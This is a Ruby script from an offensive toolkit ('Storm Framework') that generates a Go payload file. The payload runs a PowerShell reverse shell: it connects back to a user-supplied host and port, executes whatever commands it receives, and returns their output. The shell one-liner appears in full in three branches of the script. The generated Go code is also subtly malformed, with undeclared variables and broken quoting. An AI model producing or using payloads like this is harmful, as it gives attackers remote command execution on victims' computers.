#!/usr/bin/env ruby

#            ---------------------------------------------------
#                              Storm Framework
#            ---------------------------------------------------
#                  Copyright (C) <2020>  <Entynetproject>       
#
#        This program is free software: you can redistribute it and/or modify
#        it under the terms of the GNU General Public License as published by
#        the Free Software Foundation, either version 3 of the License, or
#        any later version.
#
#        This program is distributed in the hope that it will be useful,
#        but WITHOUT ANY WARRANTY; without even the implied warranty of
#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
#        GNU General Public License for more details.
#
#        You should have received a copy of the GNU General Public License
#        along with this program.  If not, see <http://www.gnu.org/licenses/>.

i = "\033[1;77m[i] \033[0m"
e = "\033[1;31m[-] \033[0m"
p = "\033[1;77m[>] \033[0m"
g = "\033[1;34m[*] \033[0m"
s = "\033[1;32m[+] \033[0m"
h = "\033[1;77m[@] \033[0m"
r = "\033[1;77m[#] \033[0m"

require 'optparse'
require 'ostruct'

options = OpenStruct.new
OptionParser.new do |opt|
    opt.on('-l', '--local-host <local_host>', 'Local host.') { |o| options.local_host = o }
    opt.on('-p', '--local-port <local_port>', 'Local port.') { |o| options.local_port = o }
    opt.on('-o', '--output-path <output_path>', 'Output path.') { |o| options.output_path = o }
    # Storm does not require target_shell
    opt.on('-h', '--help', "Show options.") do
        puts "Usage: golang.rb [-h] --local-host=<local_host> --local-port=<local_port>"
        puts "                 --target-shell=<target_shell> --output-path=<output_path>"
        puts ""
        puts "  -h, --help                     Show options."
        puts "  --local-host=<local_host>      Local host."
        puts "  --local-port=<local_port>      Local port."
        # Storm does not require target_shell
        puts "  --output-path=<output_path>    Output path."
        abort()
    end
end.parse!

host = options.local_host
port = options.local_port
# Storm does not require target_shell
file = options.output_path

if not host or not port or not file
    puts "Usage: golang.rb [-h] --local-host=<local_host> --local-port=<local_port>"
    puts "                 --target-shell=<target_shell> --output-path=<output_path>"
    puts ""
    puts "  -h, --help                     Show options."
    puts "  --local-host=<local_host>      Local host."
    puts "  --local-port=<local_port>      Local port."
    # Storm does not require target_shell
    puts "  --output-path=<output_path>    Output path."
    abort()
end
  
if File.directory? file
    if File.exists? file
        if file[-1] == "/"
            file = "#{file}payload.go"
            sleep(0.5)
            puts "#{g}Creating payload..."
            sleep(1)
            puts "#{g}Saving to #{file}..."
            sleep(0.5)
            open(file, 'w') { |f|
                f.puts "package main"
                f.puts "import ("
                f.puts "    \"os/exec\""
                f.puts ")"
                f.puts "func main() {"
                f.puts "    out, err = exec.Command(\"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient(#{host},#{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"\").Output()"
                f.puts "}"
            }
            puts "#{i}Saved to #{file}."
        else
            file = "#{file}/payload.go"
            sleep(0.5)
            puts "#{g}Creating payload..."
            sleep(1)
            puts "#{g}Saving to #{file}..."
            sleep(0.5)
            open(file, 'w') { |f|
                f.puts "package main"
                f.puts "import ("
                f.puts "    \"os/exec\""
                f.puts ")"
                f.puts "func main() {"
                f.puts "    out, err = exec.Command(\"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient(#{host},#{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"\").Output()"
                f.puts "}"
            }
            puts "#{i}Saved to #{file}."
        end
    else
        puts "#{e}Output directory: #{file}: does not exist!"
        abort()
    end
else
    direct = File.dirname(file)
    if direct == ""
        direct = "."
    else
        nil
    end
    if File.exists? direct
        if File.directory? direct
            sleep(0.5)
            puts "#{g}Creating payload..."
            sleep(1)
            puts "#{g}Saving to #{file}..."
            sleep(0.5)
            open(file, 'w') { |f|
                f.puts "package main"
                f.puts "import ("
                f.puts "    \"os/exec\""
                f.puts ")"
                f.puts "func main() {"
                f.puts "    out, err = exec.Command(\"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient(#{host},#{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"\").Output()"
                f.puts "}"
            }
            puts "#{i}Saved to #{file}."
        else
            puts "#{e}Error: #{direct}: not a directory!"
            abort()
        end
    else
        puts "#{e}Output directory: #{direct}: does not exist!"
        abort()
    end
end
